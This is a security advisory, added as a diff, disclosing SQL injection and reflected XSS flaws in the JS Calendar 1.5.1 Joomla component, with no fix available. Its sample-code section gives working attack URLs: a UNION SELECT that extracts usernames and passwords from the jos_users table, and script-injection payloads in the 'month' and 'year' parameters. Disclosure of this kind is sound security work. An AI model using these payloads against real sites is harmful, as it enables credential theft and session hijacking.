@@ -1,0 +1,86 @@
+JS Calendar 1.5.1 Joomla Component Multiple Remote Vulnerabilities
+
+ Name              JS Calendar
+ Vendor            http://www.joomlaseller.com
+ Versions Affected 1.5.1
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-10-09
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+JoomlaSeller  -  Calendar Event  is  a  powerful Joomla!
+component  which  allows you to easily create events and
+publish  them  on  a  desired date. It is a native build
+component  for  Joomla!  1.5  version  and can easily be
+installed   using   the    Joomla!    back-end   Install
+functionality.
+
+
+II. DESCRIPTION
+_______________
+
+Some parameters  are not properly sanitised before being
+used in a SQL query or returned to the user.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) SQL Injection
+ B) Multiple Reflected XSS
+ 
+
+A) SQL Injection
+________________
+
+Input  passed  to "ev_id"  parameter  is  not  properly
+sanitised before being used in SQL queries. This can be
+exploited  to  manipulate   SQL  queries  by  injecting
+arbitrary SQL code.
+
+
+B) Multiple XSS
+_______________
+
+Input  passed to the "month" and "year" parameters  are
+not  properly  sanitised  before  being returned to the
+user. This  can  be exploited to execute arbitrary HTML
+and  script  code in a users browser session in context
+of an affected site.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) SQL Injection
+
+http://site/path/index.php?option=com_jscalendar&view=jscalendar&task=details&ev_id=999 UNION SELECT 1,username,password,4,5,6,7,8 FROM jos_users
+
+
+B) Multiple XSS
+
+http://site/path/index.php?option=com_jscalendar&view=jscalendar&month=<script>alert('XSS');</script>
+
+http://site/path/index.php?option=com_jscalendar&view=jscalendar&year=<script>alert('XSS');</script>
+
+
+V. FIX
+______
+
+No fix.
+
